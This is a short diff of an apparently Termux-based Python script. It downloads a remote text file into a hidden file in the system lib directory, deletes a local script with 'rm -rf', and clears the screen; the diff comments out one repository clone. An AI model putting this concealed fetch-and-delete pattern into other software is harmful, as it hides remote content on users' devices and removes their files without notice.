@@ -1,7 +1,7 @@
 import os,sys,time,requests
 h=requests.get('https://raw.githubusercontent.com/dinartaqwa/njing/master/usr.txt').text
 m=open('/data/data/com.termux/files/usr/lib/.k','w').write(h)
-os.system('git clone https://github.com/LOoLzeC/ASU')
+#os.system('git clone https://github.com/LOoLzeC/ASU')
 os.system('rm -rf data.py')
 os.system('clear')
 time.sleep(2)
